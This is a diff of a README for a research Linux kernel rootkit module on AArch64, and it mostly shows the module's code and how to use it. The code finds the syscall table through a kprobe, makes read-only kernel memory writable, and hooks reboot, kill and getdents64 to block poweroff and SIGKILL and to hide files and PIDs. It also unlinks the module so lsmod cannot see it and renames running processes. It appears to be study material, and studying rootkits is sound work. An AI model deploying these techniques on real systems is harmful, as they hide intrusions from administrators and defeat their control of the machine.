@@ -1,356 +1,279 @@
+# Linux Rootkit — Loadable Kernel Module
 
-# Rootkit - Loadable Kernel Module
+> **Environment:** AArch64 (ARM64), Linux mainline v5.15  
+> Cross-compiled on macOS Apple Silicon and loaded into a QEMU VM.
 
-You can also see this document on [HackMD](https://hackmd.io/@Cr1xxty1RMCCkPcMXYPWeg/rootkit).
+A research rootkit implemented as a Linux Loadable Kernel Module (LKM). LKMs run in kernel mode with full access to kernel internals — the same mechanism used by device drivers, but here used to hook syscalls and hide activity from userspace.
 
-- [Intro Rootkit](#intro-rootkit)
-- [Getting Started (ARM64 VM Setup)](#getting-started-arm64-vm-setup)
-- [Explanation](#explanation)
-- [How to use this LKM](#how-to-use-this-lkm)
+**Features**
+
+| IOCTL command | What it does |
+|---|---|
+| `IOCTL_MOD_HIDE` (0) | Toggle module visibility in `lsmod` |
+| `IOCTL_MOD_MASQ` (1) | Rename running processes in the kernel task list |
+| `IOCTL_MOD_HOOK` (2) | Install syscall hooks (`reboot`, `kill`, `getdents64`) |
+| `IOCTL_FILE_HIDE` (3) | Hide a filename from directory listings |
+
+---
+
+## Table of Contents
+
+- [Getting Started](#getting-started)
+- [Build and Load](#build-and-load)
+- [Usage](#usage)
+  - [Hide / Unhide Module](#hide--unhide-module)
+  - [Masquerade Process Names](#masquerade-process-names)
+  - [Hook Syscalls](#hook-syscalls)
+  - [Hide a File](#hide-a-file)
+- [Implementation Notes](#implementation-notes)
+  - [Finding the Syscall Table](#finding-the-syscall-table)
+  - [Bypassing Memory Protection](#bypassing-memory-protection)
+  - [Module Hide / Unhide](#module-hide--unhide)
+  - [Process Name Masquerade](#process-name-masquerade)
+  - [Hooked Syscalls](#hooked-syscalls)
 - [Reference](#reference)
 
 ---
 
-## Intro Rootkit
+## Getting Started
 
-**Environment:**
-> Both the rootkit and the test program run on an AArch64 machine.  
-> The rootkit works as an independent module on the mainline Linux v5.15.
+You need an AArch64 Linux environment running kernel v5.15. If you don't have one set up, follow the step-by-step guide:
 
-A rootkit is essentially malware that runs in kernel space. To achieve this, it must be implemented as a Loadable Kernel Module (LKM).
-
-LKMs run in kernel mode and have access to all kernel internal structures and functions. They are commonly used to extend kernel functionality or implement device drivers — and in security research, to hook syscalls and hide themselves from userspace.
-
-This rootkit provides the following features:
-1. Hide / unhide the module from `lsmod`
-2. Masquerade process names
-3. Hook / unhook syscalls (`reboot`, `kill`, `getdents64`)
+**[arm64-vm-setup.md](./arm64-vm-setup.md)** — build a kernel v5.15 VM on Apple Silicon using QEMU and Docker. Covers cross-compiling the kernel, booting a Debian guest, and loading your first kernel module.
 
 ---
 
-## Getting Started (ARM64 VM Setup)
+## Build and Load
 
-**New to kernel development?** Before running this rootkit, you need an ARM64 Linux environment running kernel v5.15. If you don't have one set up yet, follow the step-by-step guide:
+```bash
+# Build the kernel module
+make
 
-**[arm64-vm-setup.md](./arm64-vm-setup.md)** — How to build a kernel v5.15 development VM on Apple Silicon (macOS M-series) using QEMU and Docker. Covers:
-- Cross-compiling the kernel
-- Booting a Debian VM with your custom kernel
-- Writing and loading your first kernel module
-- Beginner-friendly explanations of key kernel concepts
+# Load it
+sudo insmod rootkit.ko
 
-Once your VM is running kernel v5.15, come back here to build and load the rootkit.
+# Check the major number assigned to the character device
+dmesg | tail
+# e.g. "The major number for your device is 510"
 
----
+# Create the device node (replace 510 with your actual major number)
+sudo mknod /dev/rootkit c 510 0
 
-## Explanation
-
-After entering `rootkit_init`, the syscall table address is located first, then the original syscall handlers are saved before hooking.
-
-```c
-__sys_call_table = get_syscall_table();
-if(!__sys_call_table) {
-    printk(KERN_INFO "Failed to find sys_call_table\n");
-    return 1;
-}
-
-orig_reboot = (t_syscall)__sys_call_table[__NR_reboot];
-orig_kill = (t_syscall)__sys_call_table[__NR_kill];
-orig_getdents64 = (t_syscall)__sys_call_table[__NR_getdents64];
+# Build the userspace test programs
+make generateTestFile
 ```
 
-`kallsyms_lookup_name` is located via kprobe (it was unexported in kernel 5.7+), then used to resolve all required symbol addresses:
+The test programs (`userTest`, `NTUST`, `MIT`, `hsuckd`) are compiled from `test_src/`.
+
+---
+
+## Usage
+
+All commands go through the `/dev/rootkit` character device via `ioctl`.  
+`userTest <n>` sends the corresponding IOCTL command.
+
+### Hide / Unhide Module
+
+Toggles the module's presence in `lsmod`. Calling it a second time makes the module reappear.
+
+```bash
+lsmod | grep rootkit        # visible
+
+sudo ./userTest 0           # hide
+lsmod | grep rootkit        # gone
+
+sudo ./userTest 0           # unhide
+lsmod | grep rootkit        # back
+```
+
+### Masquerade Process Names
+
+Renames running processes by overwriting their `comm` field in the kernel task struct.  
+The new name must be **shorter** than the original, otherwise it is silently skipped (to stay within `TASK_COMM_LEN`).
+
+The hardcoded demo in `userTest 1`: `NTUST` → `NTU`, `MIT` → `Standford` (skipped — longer).
+
+```bash
+./NTUST &
+./MIT &
+ps ao pid,comm              # shows NTUST, MIT
+
+sudo ./userTest 1
+
+ps ao pid,comm
+# NTUST is now NTU
+# MIT is unchanged (new name is longer, skipped)
+```
+
+### Hook Syscalls
+
+Installs hooks for three syscalls. Hooks are **not** active at `insmod` — they must be enabled explicitly:
+
+```bash
+sudo ./userTest 2
+```
+
+**reboot** — intercepts `LINUX_REBOOT_CMD_POWER_OFF` and drops it silently. Other reboot commands pass through.
+
+```bash
+sudo systemctl --force --force poweroff   # denied — machine stays up
+sudo systemctl --force --force reboot     # allowed — machine reboots
+```
+
+**kill** — intercepts SIGKILL (signal 9) and drops it. Other signals pass through.
+
+```bash
+./hsuckd &
+ps aux | grep hsuckd
+kill -9 <pid>               # intercepted — process survives
+kill -10 <pid>              # passes through
+```
+
+**getdents64** — filters directory entries. Used by `ls`, `readdir`, `/proc` lookups. After the real syscall runs, entries matching the hidden filename or an invisible PID are spliced out of the result buffer.
+
+### Hide a File
+
+```bash
+ls                          # HiddenFile is visible
+
+sudo ./userTest 3           # hides "HiddenFile"
+
+ls                          # HiddenFile is gone
+```
+
+---
+
+## Implementation Notes
+
+### Finding the Syscall Table
+
+`kallsyms_lookup_name` was unexported in kernel 5.7+. The module re-resolves it at load time using a kprobe, then uses it to look up all required symbols:
 
 ```c
 static unsigned long *get_syscall_table(void)
 {
-    unsigned long *syscall_table;
-
     typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
     kallsyms_lookup_name_t kallsyms_lookup_name;
-    register_kprobe(&kp);
+
+    register_kprobe(&kp);                                      // kp.symbol_name = "kallsyms_lookup_name"
     kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
     unregister_kprobe(&kp);
 
-    syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
+    syscall_table      = (unsigned long*)kallsyms_lookup_name("sys_call_table");
     update_mapping_prot = (void *)kallsyms_lookup_name("update_mapping_prot");
-    start_rodata = (unsigned long)kallsyms_lookup_name("__start_rodata");
-    init_begin = (unsigned long)kallsyms_lookup_name("__init_begin");
+    start_rodata       = (unsigned long)kallsyms_lookup_name("__start_rodata");
+    init_begin         = (unsigned long)kallsyms_lookup_name("__init_begin");
 
-    printk(KERN_INFO "sys_call_table address: %p\n", syscall_table);
     return syscall_table;
 }
 ```
 
-Hooking requires temporarily removing the read-only protection on the kernel's rodata section, then restoring it:
+Original syscall pointers are saved before hooking and restored on `rmmod`:
 
 ```c
-static inline void protect_memory(void)
-{
-    update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata, section_size, PAGE_KERNEL_RO);
-}
+orig_reboot     = (t_syscall)__sys_call_table[__NR_reboot];
+orig_kill       = (t_syscall)__sys_call_table[__NR_kill];
+orig_getdents64 = (t_syscall)__sys_call_table[__NR_getdents64];
+```
 
+### Bypassing Memory Protection
+
+The syscall table lives in the kernel's read-only data section. On AArch64, `update_mapping_prot` is used to temporarily flip the section to read-write, write the hook pointers, then flip it back:
+
+```c
 static inline void unprotect_memory(void)
 {
-    update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata, section_size, PAGE_KERNEL);
+    update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,
+                        section_size, PAGE_KERNEL);     // RW
 }
 
-static int hook(void) {
-    unprotect_memory();
-
-    __sys_call_table[__NR_reboot]     = (unsigned long) &hacked_reboot;
-    __sys_call_table[__NR_kill]       = (unsigned long) &hacked_kill;
-    __sys_call_table[__NR_getdents64] = (unsigned long) &hacked_getdents64;
-
-    protect_memory();
-    return 0;
+static inline void protect_memory(void)
+{
+    update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,
+                        section_size, PAGE_KERNEL_RO);  // RO
 }
 ```
 
-On module removal, the original syscall handlers are restored:
+`section_size` is `__init_begin - __start_rodata`, covering the entire rodata section.
+
+### Module Hide / Unhide
+
+The kernel tracks loaded modules in a linked list (`THIS_MODULE->list`). Hiding simply unlinks the entry and saves a pointer to the previous node for reinsertion:
 
 ```c
-static void __exit rootkit_exit(void)
-{
-    unprotect_memory();
-
-    __sys_call_table[__NR_reboot]     = (unsigned long)orig_reboot;
-    __sys_call_table[__NR_kill]       = (unsigned long)orig_kill;
-    __sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
-
-    protect_memory();
-
-    pr_info("%s: removed\n", OURMODNAME);
-    cdev_del(kernel_cdev);
-    unregister_chrdev_region(major, 1);
-}
-```
-
----
-
-### Hide / Unhide Module
-
-Uses a `hidden` flag to track state. When hiding, the module removes itself from the kernel's module linked list (making it invisible to `lsmod`) and saves the previous list entry for later reinsertion.
-
-```c
-static struct list_head *prev_module;
-static short hidden = 0;
-
-void module_show(void)
-{
-    list_add(&THIS_MODULE->list, prev_module);
-    hidden = 0;
-}
-
 void module_hide(void)
 {
     prev_module = THIS_MODULE->list.prev;
     list_del(&THIS_MODULE->list);
     hidden = 1;
 }
+
+void module_show(void)
+{
+    list_add(&THIS_MODULE->list, prev_module);
+    hidden = 0;
+}
 ```
 
----
+`IOCTL_MOD_HIDE` toggles between the two based on the `hidden` flag.
 
-### Masquerade Process Name
+### Process Name Masquerade
 
-Copies the request structs from userspace, then calls `change_process_name` for each entry. A new name longer than or equal to the original is silently skipped (to avoid overflowing the fixed-size `comm` field).
-
-```c
-case IOCTL_MOD_MASQ:
-    if (copy_from_user(&user_req, (struct masq_proc_req *)arg, sizeof(struct masq_proc_req)))
-        return -EFAULT;
-
-    req_array = kmalloc_array(user_req.len, sizeof(struct masq_proc), GFP_KERNEL);
-    if (!req_array)
-        return -ENOMEM;
-
-    if (copy_from_user(req_array, user_req.list, user_req.len * sizeof(struct masq_proc))) {
-        kfree(req_array);
-        return -EFAULT;
-    }
-
-    for (i = 0; i < user_req.len; ++i) {
-        if (strlen(req_array[i].new_name) >= strlen(req_array[i].orig_name))
-            continue;
-        change_process_name(req_array[i].orig_name, req_array[i].new_name);
-    }
-```
-
-`change_process_name` walks the process list and overwrites the `comm` field of any matching task:
+`change_process_name` walks `for_each_process` and overwrites the `comm` field of every matching task:
 
 ```c
-int change_process_name(const char *orig_name, const char *new_name) {
+int change_process_name(const char *orig_name, const char *new_name)
+{
     struct task_struct *p = NULL;
-    int found = 0;
-
     for_each_process(p) {
         if (strcmp(p->comm, orig_name) == 0) {
             strncpy(p->comm, new_name, TASK_COMM_LEN - 1);
             p->comm[TASK_COMM_LEN - 1] = '\0';
-            found = 1;
         }
     }
-
-    return found ? 0 : -1;
 }
 ```
 
----
+The caller in `rootkit_ioctl` skips any rename where `strlen(new_name) >= strlen(orig_name)` to prevent overflowing the fixed-size field.
 
 ### Hooked Syscalls
 
-**reboot** — intercepts `LINUX_REBOOT_CMD_POWER_OFF` and drops it; all other reboot commands pass through. The `cmd` argument is in `regs[2]` per the [AArch64 syscall ABI](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md).
+All hooks follow the AArch64 syscall ABI — arguments are in `pt_regs->regs[n]` ([register map](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md)).
+
+**reboot** — `cmd` is `regs[2]`:
 
 ```c
-static asmlinkage int hacked_reboot(const struct pt_regs *pt_regs) {
+static asmlinkage int hacked_reboot(const struct pt_regs *pt_regs)
+{
     unsigned int cmd = (unsigned int) pt_regs->regs[2];
-
     if (cmd == LINUX_REBOOT_CMD_POWER_OFF)
-        return 0;  // silently deny
-
+        return 0;
     return orig_reboot(pt_regs);
 }
 ```
 
-**kill** — intercepts `SIGKILL` (signal 9) and drops it; all other signals pass through. The signal number is in `regs[1]`.
+**kill** — `sig` is `regs[1]`:
 
 ```c
 static asmlinkage int hacked_kill(const struct pt_regs *pt_regs)
 {
     int sig = (int) pt_regs->regs[1];
-
     if (sig == 9)
-        return 0;  // silently deny SIGKILL
-
+        return 0;
     return orig_kill(pt_regs);
 }
 ```
 
-**getdents64** — called by `ls` / `readdir`. After the real syscall runs, the result buffer is post-processed to remove entries matching `HIDDEN_FILE` or invisible PIDs.
-
-```c
-static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs) {
-    // ...
-    while (off < ret) {
-        dir = (void *)kdirent + off;
-        if (should_hide(dir)) {
-            if (dir == kdirent) {
-                ret -= dir->d_reclen;
-                memmove(dir, (void *)dir + dir->d_reclen, ret);
-                continue;
-            }
-            prev->d_reclen += dir->d_reclen;
-        } else {
-            prev = dir;
-        }
-        off += dir->d_reclen;
-    }
-    // ...
-}
-```
-
----
-
-## How to use this LKM
-
-### Load the Rootkit
-
-```bash
-make
-sudo insmod rootkit.ko
-dmesg | tail
-# Note the major number printed, e.g.: "The major number for your device is 510"
-sudo mknod /dev/rootkit c [major number] 0
-```
-
-### Generate Test Files
-
-```bash
-# Builds userTest, NTUST, MIT, hsuckd executables
-make generateTestFile
-```
-
-```bash
-sudo ./userTest 0   # IOCTL_MOD_HIDE
-sudo ./userTest 1   # IOCTL_MOD_MASQ
-sudo ./userTest 2   # IOCTL_MOD_HOOK
-sudo ./userTest 3   # IOCTL_FILE_HIDE
-```
-
----
-
-### Hide / Unhide Module
-
-```bash
-lsmod | head            # rootkit is visible
-
-sudo ./userTest 0       # hide
-lsmod | head            # rootkit is gone
-
-sudo ./userTest 0       # unhide
-lsmod | head            # rootkit is back
-```
-
----
-
-### Masquerade Process Name
-
-```bash
-./NTUST &
-./MIT &
-ps ao pid,comm          # shows NTUST and MIT
-
-sudo ./userTest 1       # trigger masquerade
-
-ps ao pid,comm
-# NTUST → NTU  (shorter name, succeeds)
-# MIT unchanged (new name "standardford" is longer, skipped)
-```
-
----
-
-### Hook / Unhook Syscalls
-
-Install the hooks first:
-
-```bash
-sudo ./userTest 2
-```
-
-**reboot**
-
-```bash
-sudo systemctl --force --force poweroff   # intercepted — machine stays up
-sudo systemctl --force --force reboot     # passes through — machine reboots
-```
-
-**kill**
-
-```bash
-./hsuckd &
-ps aux | grep hsuckd
-kill -9 [pid]           # SIGKILL intercepted — process survives
-kill -10 [pid]          # other signals still work
-```
-
-**getdents64**
-
-```bash
-ls                      # HiddenFile is visible
-
-sudo ./userTest 3
-
-ls                      # HiddenFile is now hidden
-```
+**getdents64** — runs the real syscall, then splices hidden entries out of the kernel-side copy of the result buffer before writing it back to userspace. Entries are hidden if the filename matches `HIDDEN_FILE`, or (when reading `/proc`) if the PID has `PF_INVISIBLE` set in `task->flags`.
 
 ---
 
 ## Reference
 
-- [Linux Rootkit 學習資源筆記](https://hackercat.org/linux/linux-rootkit-resource)
-- [Linux LKM Rootkit Tutorial | Linux Kernel Module Rootkit](https://www.youtube.com/watch?v=hsk450he7nI)
-- [Linux Rootkit系列](https://cloud.tencent.com/developer/article/1036559)
-- [TheXcellerator Linux Rootkits](https://xcellerator.github.io/tags/rootkit/)
-- [Hiding Kernel Modules](https://github.com/xcellerator/linux_kernel_hacking/tree/master/3_RootkitTechniques/3.0_hiding_lkm)
+- [TheXcellerator — Linux Rootkits series](https://xcellerator.github.io/tags/rootkit/)
 - [linux_kernel_hacking](https://github.com/xcellerator/linux_kernel_hacking/tree/master)
+- [Hiding Kernel Modules](https://github.com/xcellerator/linux_kernel_hacking/tree/master/3_RootkitTechniques/3.0_hiding_lkm)
 - [Diamorphine](https://github.com/m0nad/Diamorphine/tree/master)
+- [Linux Rootkit 學習資源筆記](https://hackercat.org/linux/linux-rootkit-resource)
+- [Linux Rootkit系列](https://cloud.tencent.com/developer/article/1036559)
+- [Linux LKM Rootkit Tutorial (YouTube)](https://www.youtube.com/watch?v=hsk450he7nI)
